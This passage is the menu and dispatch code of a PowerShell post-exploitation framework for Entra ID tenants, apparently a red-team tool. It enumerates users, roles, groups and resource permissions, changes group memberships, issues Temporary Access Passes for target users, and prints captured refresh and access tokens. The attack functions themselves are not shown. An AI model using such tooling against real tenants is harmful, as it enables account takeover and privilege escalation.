            Write-Host ""
        }
            Show-MainMenu
        } else {
            Write-Host "[!] Invalid selection. Please try again." -ForegroundColor DarkRed
            Write-Host ""
            Show-IdentitiesMenu
        }
    }


    function Show-MainMenu {
        while ($true) {
            Write-Host "`n================== Entra Framework Menu ==================" -ForegroundColor DarkCyan
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "ID", "Function", "Description") -ForegroundColor White
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "--", "--------", "-----------") -ForegroundColor White
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "1)", "Invoke-FindDynamicGroups", "Identify dynamic groups in the target Entra ID tenant and analyze their membership rules") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "2)", "Invoke-FindPublicGroups", "Enumerate public Microsoft 365 groups in the target Entra ID tenant, and optionally read their message content") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "3)", "Invoke-FindServicePrincipal", "Enumerate service principals that support delegated user access in the target Entra ID tenant") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "4)", "Invoke-FindUserRole", "Enumerate all users (UPNs) in the target Entra ID tenant and identify their assigned directory roles") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "5)", "Invoke-FindUserByWord", "Search for user accounts in the target Entra ID tenant by matching a specific keyword.") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "6)", "Invoke-FindGroup", "Search for Security,O365 group in the target Entra ID tenant by matching a specific keyword.s") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "7)", "Invoke-MembershipChange", "Add or remove a user (including yourself) from one or more groups in the target Entra ID tenant.") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "8)", "Invoke-ResourcePermissions", "Enumerate your effective role assignments on Azure resources, including Key Vaults, Storage Accounts, and Virtual Machines.") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "9)", "Invoke-TAPChanger", "Add or remove a Temporary Access Pass (TAP) for a target user in the Entra ID tenant.") -ForegroundColor DarkYellow
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "--", "--------", "-----------") -ForegroundColor White
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "10)", "RefreshToken", "Show Refresh Token") -ForegroundColor DarkGreen
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "11)", "Graph Access Token", "Show Graph Access Token") -ForegroundColor DarkGreen
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "12)", "ARM Access Token", "Show ARM Access Token") -ForegroundColor DarkGreen
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "--", "--------", "-----------") -ForegroundColor White
            Write-Host ("{0,-5} {1,-35} {2,-50}" -f "13)", "Identity Menu", "Show all Identities") -ForegroundColor DarkCyan
            $choice = Read-Host "`n[>] Select an option"
            $RefreshToken = $Global:RefreshToken
            $ClientID = $Global:clientID
            $ClientSecret = $Global:ClientSecret
            $GraphAccessToken = $Global:GraphAccessToken
            $ARMAccessToken =  $Global:ARMAccessToken
            $TenantID = $Global:TenantID
            $TenantName = $Global:TenantName

            switch ($choice) {
                "1" {
                    if ($RefreshToken -eq $null -and $ClientID -ne $null -and $ClientSecret -ne $null) {
                            Invoke-FindDynamicGroups -ClientID $ClientID -ClientSecret $ClientSecret -GraphAccessToken $GraphAccessToken -TenantID $TenantID -TenantName $TenantName
                        }
                    if ($ClientID -eq $null -and $ClientSecret -eq $null -and $RefreshToken -ne $null)  {
                            Invoke-FindDynamicGroups -RefreshToken $RefreshToken -GraphAccessToken $GraphAccessToken -TenantID $TenantID -TenantName $TenantName
                    }
                }

                "2" {
					$choice = $null
					$useDeep = $null
                    Write-Host "`n[?] Do you want to perform a deep search with conversation scanning? (Y/N)" -ForegroundColor DarkCyan
                    $choice = Read-Host "Select Option"

                    $useDeep = $false
                    if ($choice -match '^(Y|y)$') {
                        $useDeep = $true
                    }

                    if ($RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null) {
                        if ($useDeep) {
                            Invoke-FindPublicGroups -RefreshToken $RefreshToken -GraphAccessToken $GraphAccessToken -TenantID $TenantID -TenantName $TenantName -Deep
                        } else {
                            Invoke-FindPublicGroups -RefreshToken $RefreshToken -GraphAccessToken $GraphAccessToken -TenantID $TenantID -TenantName $TenantName
                        }
                    }
                    elseif ($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null) {
                        if ($useDeep) {
                            Invoke-FindPublicGroups -ClientID $ClientID -ClientSecret $ClientSecret -GraphAccessToken $GraphAccessToken -TenantID $TenantID -TenantName $TenantName -Deep
                        } else {
                            Invoke-FindPublicGroups -ClientID $ClientID -ClientSecret $ClientSecret -GraphAccessToken $GraphAccessToken -TenantID $TenantID -TenantName $TenantName
                        }
                    }
                    else {
                        Write-Host "[!] No valid authentication method provided. Please authenticate first." -ForegroundColor Red
                    }
					
                }


                "3" {
                    if($RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null) {
                        Invoke-FindServicePrincipal -RefreshToken $RefreshToken -GraphAccessToken $GraphAccessToken -TenantName $TenantName -TenantID $TenantID
                    }
                    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null) {
                        Invoke-FindServicePrincipal -ClientID $ClientID -ClientSecret $ClientSecret -GraphAccessToken $GraphAccessToken -TenantName $TenantName -TenantID $TenantID
                    }       
                }

                "4" {
                    if($RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null) {
                        Invoke-FindUserRole -RefreshToken $RefreshToken -GraphAccessToken $GraphAccessToken -TenantName $TenantName -TenantID $TenantID
                    }
                     if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null) {
                        Invoke-FindUserRole -ClientID $ClientID -ClientSecret $ClientSecret -GraphAccessToken $GraphAccessToken -TenantName $TenantName -TenantID $TenantID
                    }
                } 

                "5" {
					$word = $null
                    while ($true) {
                        if (-not $word -or $word -eq $null) {
                            Write-Host "`n Please provide a word to search for a user." -ForegroundColor cyan
                            $word = Read-Host "[>] Enter word to search for user"
                        } else {
                            break
                        }
                    }

                    if($RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null) {
                        Invoke-FindUserByWord -RefreshToken $RefreshToken -TenantID $TenantID -TenantName $TenantName -GraphAccessToken $GraphAccessToken -Word $word
                    }
                    elseif ($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null) {
                        Invoke-FindUserByWord -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID -TenantName $TenantName -GraphAccessToken $GraphAccessToken -Word $word
                    }
                    else {
                        Write-Host "[!] No valid authentication method loaded. Please load identity first." -ForegroundColor Red
                    }
					
                }


                "6" {
					$word = $null
                    while ($true) {
                        if (-not $word -or $word -eq $null) {
                            Write-Host "`Please provide a word to search." -ForegroundColor Cyan
                            $word = Read-Host "[>] Enter word to search for group name"
                        } else {
                            break
                        }
                    }

                    if($RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null) {
                        Invoke-FindGroup -GraphAccessToken $GraphAccessToken -Word $word -TenantName $TenantName
                    }
                    elseif ($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null) {
                        Invoke-FindGroup -ClientID $ClientID -ClientSecret $ClientSecret -Word $word -TenantName $TenantName
                    }
                    else {
                        Write-Host "[!] No valid authentication method loaded. Please load identity first." -ForegroundColor Red
                    }
                }


                "7" {
					$selfChoice = $null
					$UserID = $null
					$action = $null
					$groupType = $null
                    while ($true) {
							if(-not $selfChoice -or $selfChoice -eq $null){
                        Write-Host "`nDo you want to manage your own membership or someone else's?" -ForegroundColor Cyan
                        $selfChoice = Read-Host "(Y)ourself / (O)ther user"
						}
                        if ($selfChoice -eq "Y") {
                            $UserID = $null 

                        } elseif ($selfChoice -eq "O") {
                            $UserID = Read-Host "Enter User ID"
                        } else {
                            Write-Host "[!] Invalid selection. Please enter Y or O." -ForegroundColor Red
                            continue
                        }

                        $action = Read-Host "Do you want to (A)dd or (R)emove from group(s)?"
                        if ($action -ne "A" -and $action -ne "R") {
                            Write-Host "[!] Invalid action. Enter A or R." -ForegroundColor Red
                            continue
                        }

                        $groupType = Read-Host "Target a (O)ne group or a (L)ist of groups?"
                        if ($groupType -ne "O" -and $groupType -ne "L") {
                            Write-Host "[!] Invalid input. Enter O or L." -ForegroundColor Red
                            continue
                        }

                        if ($groupType -eq "O") {
                            $GroupIdsInput = Read-Host "Enter Group ID"
                        } else {
                            $GroupIdsInput = Read-Host "Enter path to group list"
                        }

                        
                        $params = @{
                            RefreshToken     = $RefreshToken
                            GraphAccessToken = $GraphAccessToken
                            TenantID         = $TenantID
                            GroupIdsInput    = $GroupIdsInput
                            Action           = if ($action -eq "A") { "Add" } else { "Delete" }
                        }

                        if ($UserID) {
                            $params.UserID = $UserID
                        }

                        Invoke-MembershipChange @params

                        $again = Read-Host "`nDo you want to perform another membership change? (Y/N)"
                        if ($again -ne "Y") {
                            break
                        }
                    }
					
                }

                "8" {
					$selfChoice = $null
                    if ($RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null) {
                        Write-Host "`nWhat do you want to enumerate?" -ForegroundColor Cyan
                        Write-Host "   1) KeyVaults" -ForegroundColor Yellow
                        Write-Host "   2) Storage Accounts" -ForegroundColor Yellow
                        Write-Host "   3) Virtual Machines" -ForegroundColor Yellow
                        Write-Host "   4) All Resources" -ForegroundColor Yellow
                        Write-Host "   5) Back to Main Menu" -ForegroundColor Yellow

                        $selfChoice = Read-Host "`n[>] Enter your choice (1-5)"

                        switch ($selfChoice) {
                            "1" {
                                Invoke-ResourcePermissions -RefreshToken $RefreshToken -ARMAccessToken $ARMAccessToken -TenantID $TenantID -KeyVault -ref
                            }

                            "2" {
                                Invoke-ResourcePermissions -RefreshToken $RefreshToken -ARMAccessToken $ARMAccessToken -TenantID $TenantID -StorageAccount -ref
                            }
                            "3" {
                                Invoke-ResourcePermissions -RefreshToken $RefreshToken -ARMAccessToken $ARMAccessToken -TenantID $TenantID -VirtualMachine -ref
                            }

                            "4" {
                                Invoke-ResourcePermissions -RefreshToken $RefreshToken -ARMAccessToken $ARMAccessToken -TenantID $TenantID -All -ref
                            }
                            "5" {
                                Show-MainMenu
                            }
                            default {
                                Write-Warning "Invalid choice. Please select 1-5."
                            }
                        }
                    } elseif($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null) {
                        Write-Host "`nWhat do you want to enumerate?" -ForegroundColor Cyan
                        Write-Host "   1) KeyVaults" -ForegroundColor Yellow
                        Write-Host "   2) Storage Accounts" -ForegroundColor Yellow
                        Write-Host "   3) Virtual Machines" -ForegroundColor Yellow
                        Write-Host "   4) All Resources" -ForegroundColor Yellow
                        Write-Host "   5) Back to Main Menu" -ForegroundColor Yellow

                        $selfChoice = Read-Host "`n[>] Enter your choice (1-5)"
                        switch ($selfChoice) {
                            "1" {
                                Invoke-ResourcePermissions -ClientID $ClientID -ClientSecret $ClientSecret -ARMAccessToken $ARMAccessToken -TenantID $TenantID -KeyVault -clin
                            }
                            "2" {
                                Invoke-ResourcePermissions -ClientID $ClientID -ClientSecret $ClientSecret -ARMAccessToken $ARMAccessToken -TenantID $TenantID -StorageAccount -clin
                            }
                            "3" {
                                Invoke-ResourcePermissions -ClientID $ClientID -ClientSecret $ClientSecret -ARMAccessToken $ARMAccessToken -TenantID $TenantID -VirtualMachine -clin
                            }
                            "4" {
                                Invoke-ResourcePermissions -ClientID $ClientID -ClientSecret $ClientSecret -ARMAccessToken $ARMAccessToken -TenantID $TenantID -All -clin
                            }
                            "5" {
                                Show-MainMenu
                            }
                            default {
                                Write-Warning "Invalid choice. Please select 1-5."
                            }
                        }

                    } 
                }
                "9" {
					$selfChoice = $null
                    Write-Host "`nDo you want to Add or Delete a Temporary Access Pass (TAP)?" -ForegroundColor Cyan
                    $selfChoice = Read-Host "[>] A(dd) or D(elete)"

                    if ($selfChoice -match '^(Add|A|a|add)$') {
                        Write-Host "`n[+] Which user account do you want to ADD a TAP for?" -ForegroundColor Cyan
                        $UseTargetID = Read-Host "[>] Enter User ID"
                        Invoke-TAPChanger -GraphAccessToken $GraphAccessToken -UseTargetID $UseTargetID -Add
                    }
                    elseif ($selfChoice -match '^(Delete|D|d|delete)$') {
                        Write-Host "`n[+] Which user account do you want to DELETE a TAP from?" -ForegroundColor Cyan
                        $UseTargetID = Read-Host "[>] Enter User ID"
                        Invoke-TAPChanger -GraphAccessToken $GraphAccessToken -UseTargetID $UseTargetID -Delete
                    }
                    else {
                        Write-Warning "Invalid choice. Please enter Add or Delete."
                    }
                }
                "10"  { Write-Host "$RefreshToken" -ForegroundColor Cyan }

                "11" { Write-Host "$GraphAccessToken" -ForegroundColor Cyan }

                "12" { Write-Host "$ARMAccessToken" -ForegroundColor Cyan }

                "13" { Show-IdentitiesMenu }

                "14" { break }
                default { Write-Host "[!] Invalid option." -ForegroundColor Red }
            }
        }
    }

    function Start-IdentityLoop {
        while ($true) {
            $success = Initialize-Session
            if ($success) {
                $last = $Global:Identities[-1]
                if ($last.UPN) {
                    Write-Host "`n[+] Identity for $($last.UPN) added." -ForegroundColor DarkCyan
                } elseif ($last.AppName) {
                    Write-Host "`n[+] Identity for $($last.AppName) added." -ForegroundColor DarkCyan
                }

                do {
                    Write-Host "Do you want to add another identity? (y/n)" -ForegroundColor DarkYellow
                    $continue = Read-Host "[>]"
                } while ($continue -notin @("y", "n"))
                    if ($continue -eq "n") {
                    break  
                    }   
            } else {
                Write-Host "[!] Failed to initialize identity. Try again." -ForegroundColor Red
            }
        }
        Show-IdentitiesMenu  
    }

Start-IdentityLoop

}
